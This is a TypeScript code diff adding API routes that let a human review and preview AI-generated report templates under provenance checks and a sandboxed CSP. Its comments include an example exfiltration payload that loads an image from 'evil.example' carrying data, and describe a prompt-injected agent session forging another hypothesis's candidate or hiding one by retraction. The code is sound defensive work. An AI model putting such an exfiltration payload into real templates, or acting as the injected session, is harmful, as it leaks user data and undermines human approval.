@@ -67,15 +67,22 @@ import { parseCanonicalCsvBytes } from "../hypothesis/points.js";
 import { extractSpecJsonText } from "../hypothesis/provision.js";
 import { validateSpec, type Spec } from "../hypothesis/spec.js";
 import {
+  crossHypothesisTamper,
+  hasEmptyProvenance,
+  hostileRetractionTamper,
+  isOwnReport,
   newestTrustedRow,
+  reportOwnerFor,
   type HypothesisStore,
   type SessionLookup,
+  type Tamper,
 } from "../hypothesis/store.js";
-import { composeFrame, type SlotContent } from "../report/frame.js";
+import { codeOrigins, composeFrame, type SlotContent } from "../report/frame.js";
 import {
   AMENDMENT_LABEL,
   AMENDMENT_STATUS_PROPOSED,
   KIND_REPORT_AMENDMENT,
+  KIND_REPORT_CANDIDATE,
   LABEL_VALUE_PATTERN,
   MAX_LABEL_VALUE_LENGTH,
   buildReportAmendmentContent,
@@ -126,6 +133,68 @@ export interface ReportTemplateResponse {
    */
   remote_origins: string[];
   script_srcs: string[];
+}
+
+/**
+ * `GET /api/hypotheses/:id/report-candidate` — what the go-live review screen
+ * reads (W24, R206).
+ *
+ * `kind=report-candidate` had a WRITER and no READER for nine tickets. This is
+ * the reader, and the shape is driven entirely by what a human has to see
+ * before their click LOCKS a template.
+ *
+ * 🔴 **`script_srcs` is not `code_origins` and the difference is the point.**
+ * `script_srcs` is `parseTemplate`'s raw list — every `script[src]`,
+ * `link[rel=stylesheet][href]` and CSS `@import` target, **in document order,
+ * neither deduplicated nor sorted, and NOT https-only**. `code_origins` is
+ * what W19 actually substitutes into `script-src`/`style-src`, derived by
+ * `frame.ts`'s own `codeOrigins()`. A screen labelling the first list
+ * "permitted script origins" would be lying to the human approving it
+ * (R155): a CSS `@import url(data:…)` validates clean, lands in
+ * `script_srcs`, and contributes no origin at all.
+ *
+ * 🔴 **`remote_origins` is the SUPERSET and it is the one that closes R116's
+ * second gap.** A template exfiltrating through
+ * `<img src="https://evil.example/?d=…">` carries no code, appears nowhere in
+ * `script_srcs`, and was approved by a human who never saw the host. Every
+ * origin here was seen by W16's validator — and per **R173** that is what the
+ * validator saw, not a guarantee: SVG `fill`/`filter` is an unscanned channel.
+ *
+ * 🔴 **`html` is here and the locked frame's is NOT, and the asymmetry is
+ * deliberate.** `composeReportStats` withholds the composed document because
+ * the bytes are safe only inside the sandboxed frame the CSP header applies
+ * to. These bytes are different: they are the body the accept button POSTs
+ * back to `…/report-template`, so the client must hold them, and the round
+ * trip must be byte-exact or the hash the human approved and the hash Wolf
+ * locks would differ. They are never rendered as HTML — the PREVIEW comes
+ * from `…/report-candidate/frame`, by URL, with the real CSP and the real
+ * sandbox.
+ */
+export interface ReportCandidateResponse {
+  /** The candidate row's Orange memory id. */
+  memory_id: string;
+  /** Line 1 of the candidate: the interview's own summary of what it proposes. */
+  summary: string;
+  /** Everything after line 1: the proposed template fragment, verbatim. */
+  html: string;
+  /** Unix **milliseconds** — the memory table's unit, not the `agent_*` tables' seconds. */
+  created_at_ms: number;
+  /** Provenance, carried through UNMODIFIED, for the § 2 `model` stamp. */
+  created_by_worker: string;
+  created_by_session: string;
+  /** sha256 of `html`; `null` when the candidate does not validate. */
+  structure_hash: string | null;
+  /** Raw URLs, document order. See the note above: NOT the CSP's origin set. */
+  script_srcs: string[];
+  /** Every host the document will contact, sorted and deduplicated. */
+  remote_origins: string[];
+  /** The origins `script-src`/`style-src` will carry. A SUBSET of `remote_origins`, often equal. */
+  code_origins: string[];
+  /** False when the proposed template fails W16's validator; the errors say why. */
+  valid: boolean;
+  errors: TemplateError[];
+  /** Cross-hypothesis writes and hostile retractions witnessed while reading. */
+  tamper: Tamper[];
 }
 
 export interface ReportAmendmentResponse {
@@ -281,6 +350,22 @@ function validateSubmittedTemplate(html: string, maxBytes: number, message: stri
  * request it cannot fix. The real errors are logged server-side with the
  * memory id; `internal`'s message never reaches the client (R39).
  */
+/**
+ * The `{path, message}` list out of a `templateValidationError`'s details bag.
+ *
+ * Defensive on every step because `details` is `unknown`: an error carrying
+ * none, or one whose `errors` is not an array, yields `[]` rather than
+ * throwing inside a catch block. Written once because two callers need it —
+ * the stored-template path logs them, and W24's candidate read shows them to
+ * the human who has to fix the template.
+ */
+function templateErrorsOf(err: WolfError): TemplateError[] {
+  const details = err.details;
+  if (typeof details !== "object" || details === null) return [];
+  const errors = (details as { errors?: unknown }).errors;
+  return Array.isArray(errors) ? (errors as TemplateError[]) : [];
+}
+
 function parseStoredTemplate(
   html: string,
   maxBytes: number,
@@ -290,12 +375,7 @@ function parseStoredTemplate(
     return validateTemplate(html, maxBytes);
   } catch (err) {
     if (err instanceof WolfError && err.kind === "invalid") {
-      const details = err.details;
-      const errors =
-        typeof details === "object" && details !== null && "errors" in details
-          ? ((details as { errors: TemplateError[] }).errors ?? [])
-          : [];
-      onFailure(errors);
+      onFailure(templateErrorsOf(err));
       // No `details`: the shared handler strips an `internal` message and
       // this error's details would name the template's own contents.
       throw new WolfError("internal", "the stored report template no longer validates", {
@@ -743,6 +823,262 @@ export function createReportRouter(options: CreateReportRouterOptions): ReportRo
           script_srcs: parsed.scriptSrcs,
         };
         res.status(201).json(response);
+      })().catch(next);
+    },
+  );
+
+  // ── GET /api/hypotheses/:id/report-candidate (+ /frame) ───────────────
+
+  /** One `kind=report-candidate` row, read in full. */
+  interface CandidateRecord {
+    memoryId: string;
+    /** Line 1: the interview's summary of what it is proposing. */
+    summary: string;
+    /** Everything after line 1: the proposed template fragment. */
+    html: string;
+    createdAtMs: number;
+    createdByWorker: string;
+    createdBySession: string;
+  }
+
+  /**
+   * The newest `report-candidate` this hypothesis OWNS, plus what was
+   * witnessed on the way to it.
+   *
+   * 🔴 **`isTrusted` is the WRONG rule here and using it would reject every
+   * legitimate candidate.** A candidate is written by the interviewer from
+   * inside the container, so its provenance is never empty and clause 1 of
+   * the trust model always fails. The rule that applies is W22's
+   * `isOwnReport`, the same one `kind=report` gets: the row's provenance must
+   * name this hypothesis's own `researcher-<id>` worker or its `hyp-<id>`
+   * session, both stamped by Orange from the caller's credential and neither
+   * settable from a request body. Anything else is a `cross_hypothesis_write`
+   * — a prompt-injected session running for hypothesis A appending
+   * `kind=report-candidate, name=B` — and **this is the worst place in the
+   * product to skip that check, because the human's next click LOCKS the
+   * template**.
+   *
+   * ⚠️ It re-implements `store.ts`'s `pickSurvivingRow` loop rather than
+   * calling it, and that is a limitation rather than a choice:
+   * `pickSurvivingRow` is private to `createHypothesisStore`, `store.ts` is
+   * another ticket's file this wave, and there is no `readCandidate` on the
+   * store to call. Every rule it applies comes from the SHARED exported
+   * primitives — `isOwnReport`, `reportOwnerFor`, `crossHypothesisTamper`,
+   * `hostileRetractionTamper`, `hasEmptyProvenance` — so the trust boundary
+   * itself is not duplicated, only the walk over rows.
+   *
+   * ⚠️ An earlier version of this comment said `readLockedSpec` above "already
+   * has the same shape, for the same reason". It does not: that function
+   * re-implements no loop at all, because the read it needs — the newest
+   * TRUSTED row — is already exported as `newestTrustedRow`. There is no
+   * exported equivalent for "the newest row this hypothesis OWNS", and that
+   * absence is the whole reason this loop exists. Adding one means editing
+   * `store.ts`.
+   */
+  async function readCandidate(
+    id: string,
+    sessions: SessionLookup,
+  ): Promise<{ record: CandidateRecord | null; tamper: Tamper[] }> {
+    const rows = await client.listMemories({
+      selector: reportSelector(KIND_REPORT_CANDIDATE, id),
+      limit: ROW_LIMIT,
+      // Without it Orange filters retracted rows server-side, so a retraction
+      // written from INSIDE A CONTAINER hides the candidate and the screen
+      // says "the interview has not produced one yet" — an erasure
+      // indistinguishable from the empty state.
+      includeRetracted: true,
+    });
+
+    const owner = reportOwnerFor(id, sessions);
+    const tamper: Tamper[] = [];
+    const add = (t: Tamper): void => {
+      if (tamper.some((x) => x.reason === t.reason && x.memory_id === t.memory_id)) return;
+      tamper.push(t);
+    };
+
+    let winner: MemorySearchResultRow | null = null;
+    for (const row of rows) {
+      if (row.labels["name"] !== id) continue;
+      if (!isOwnReport(row, owner)) {
+        add(crossHypothesisTamper(row));
+        continue;
+      }
+      let withdrawnByWolf = false;
+      for (const retraction of row.retractedBy ?? []) {
+        // A retraction WOLF wrote (empty provenance) really withdraws the row.
+        // One written inside a container does not — it is reported instead.
+        if (hasEmptyProvenance(retraction)) withdrawnByWolf = true;
+        else add(hostileRetractionTamper(retraction));
+      }
+      if (withdrawnByWolf) continue;
+      // Keep scanning after the winner: an anomaly on an OLDER row is still an
+      // anomaly, and dropping it is how a forgery goes silent on one surface
+      // while another still names it.
+      if (winner === null) winner = row;
+    }
+
+    if (winner === null) return { record: null, tamper };
+
+    // A second request, deliberately: the list route returns
+    // `substring(content, 1, 500)` and a template fragment routinely runs to
+    // tens of kilobytes. A route reading `snippet` would hand a human half a
+    // template to approve and pass every other assertion.
+    const full = await client.getMemoryById(winner.id);
+    const parsed = parseTemplateContent(full.content);
+    return {
+      record: {
+        memoryId: full.id,
+        summary: parsed.first,
+        html: parsed.html,
+        createdAtMs: full.createdAtMs,
+        createdByWorker: full.createdByWorker,
+        createdBySession: full.createdBySession,
+      },
+      tamper,
+    };
+  }
+
+  /**
+   * The empty state, carrying what was witnessed.
+   *
+   * 🔴 `tamper` is in the 404's details and that is the blocking half. "No
+   * candidate exists" and "the only candidate was written by something that
+   * is not this hypothesis" are different facts, and rendering the second as
+   * the first hides an attack behind a benign empty state — the exact failure
+   * R185 records for the detail route's `drift: null`.
+   */
+  function candidateNotFound(id: string, tamper: readonly Tamper[]): WolfError {
+    return new WolfError("not_found", `hypothesis ${id} has no report candidate`, {
+      details: { id, reason: "no_report_candidate", tamper: [...tamper] },
+    });
+  }
+
+  /** The session list is the authoritative index of hypotheses, never memory. */
+  async function requireKnownHypothesis(id: string): Promise<SessionLookup> {
+    const index = await store.readSessionIndex();
+    if (!index.has(id)) {
+      throw new WolfError("not_found", `no hypothesis ${id}`, { details: { id } });
+    }
+    return index;
+  }
+
+  router.get(
+    "/api/hypotheses/:id/report-candidate",
+    requireSignedIn,
+    (req: Request, res: Response, next) => {
+      void (async () => {
+        const id = requireHypothesisId(req.params["id"]);
+        const sessions = await requireKnownHypothesis(id);
+        const { record, tamper } = await readCandidate(id, sessions);
+        if (record === null) throw candidateNotFound(id, tamper);
+
+        // A candidate that does not validate is the MODEL'S mistake — not the
+        // caller's (so not a 422) and not Wolf's stored state (so not an
+        // `internal`). The human is shown what is wrong and the accept button
+        // has nothing to post; that is a 200 describing a bad proposal.
+        let parsed: ParsedTemplate | null = null;
+        let errors: TemplateError[] = [];
+        try {
+          parsed = validateTemplate(record.html, config.reportMaxBytes);
+        } catch (err) {
+          if (!(err instanceof WolfError) || err.kind !== "invalid") throw err;
+          errors = templateErrorsOf(err);
+        }
+
+        logger.info(
+          {
+            id,
+            memory_id: record.memoryId,
+            valid: parsed !== null,
+            script_srcs: parsed?.scriptSrcs.length ?? 0,
+            remote_origins: parsed?.remoteOrigins.length ?? 0,
+            tamper: tamper.length,
+          },
+          "report candidate read",
+        );
+
+        const response: ReportCandidateResponse = {
+          memory_id: record.memoryId,
+          summary: record.summary,
+          html: record.html,
+          created_at_ms: record.createdAtMs,
+          created_by_worker: record.createdByWorker,
+          created_by_session: record.createdBySession,
+          structure_hash: parsed?.structureHash ?? null,
+          script_srcs: parsed?.scriptSrcs ?? [],
+          remote_origins: parsed?.remoteOrigins ?? [],
+          // 🔴 `frame.ts`'s own derivation, never a second one here. This is
+          // the set W19 substitutes into `script-src`, and the screen must not
+          // show the human a different answer from the one Wolf enforces.
+          code_origins: parsed === null ? [] : codeOrigins(parsed.scriptSrcs),
+          valid: parsed !== null,
+          errors,
+          tamper,
+        };
+        res.status(200).json(response);
+      })().catch(next);
+    },
+  );
+
+  /**
+   * The candidate PREVIEW, as a document.
+   *
+   * 🔴 **It exists because a CSP is a header, and a header can only apply to a
+   * document the browser fetched.** W24's criterion is that the candidate
+   * renders inside the real frame component with the real CSP and the real
+   * sandbox — "reviewing a preview that differs from production defeats the
+   * purpose of reviewing" — and `GET …/report/frame` cannot serve it: that
+   * route reads the LOCKED template, and at review time there is none. A
+   * `srcdoc` preview would carry no CSP header at all, and a
+   * `<meta http-equiv>` copy silently ignores `sandbox` and
+   * `frame-ancestors`, which are the two directives that make this document
+   * safe.
+   *
+   * It is the same `composeFrame` call the locked route makes, so the derived
+   * policy is derived the same way, from the same bytes the human is about to
+   * approve.
+   *
+   * 🔴 **The slots are EMPTY.** A candidate has never been filled by a tick,
+   * and splicing the LOCKED template's slot content into it would show the
+   * human yesterday's numbers as though this proposal had produced them. The
+   * series payload is real, because a template's chart code reads
+   * `window.__WOLF_SERIES__` and a preview drawn from an empty global is not
+   * the document that will be served.
+   *
+   * Deliberately NOT cached: a candidate is previewed by one human, once, and
+   * the frame cache is keyed on a locked template's `structureHash`.
+   */
+  router.get(
+    "/api/hypotheses/:id/report-candidate/frame",
+    requireSignedIn,
+    (req: Request, res: Response, next) => {
+      void (async () => {
+        const id = requireHypothesisId(req.params["id"]);
+        const sessions = await requireKnownHypothesis(id);
+        const { record, tamper } = await readCandidate(id, sessions);
+        if (record === null) throw candidateNotFound(id, tamper);
+
+        // 422 `invalid`, never `internal`: a model wrote this template, so a
+        // rejection is not evidence that Wolf has a bug (§ "Shared error
+        // taxonomy"). The same `{path, message}` list the read above carries.
+        const parsed = validateSubmittedTemplate(
+          record.html,
+          config.reportMaxBytes,
+          "the proposed report template is not valid, so it cannot be previewed",
+        );
+
+        const spec = await readLockedSpec(id, sessions);
+        const versions = await readVersions(id, spec);
+        const seriesByMetric = await readSeries(id, versions);
+        const series =
+          spec === undefined ? {} : buildSeriesPayload(spec, seriesByMetric, config.seriesMaxPoints);
+
+        const composed = composeFrame({ template: parsed, slots: {}, series });
+        logger.info(
+          { id, memory_id: record.memoryId, structure_hash: parsed.structureHash, tamper: tamper.length },
+          "report candidate frame composed",
+        );
+        send(res, composed.html, composed.csp);
       })().catch(next);
     },
   );
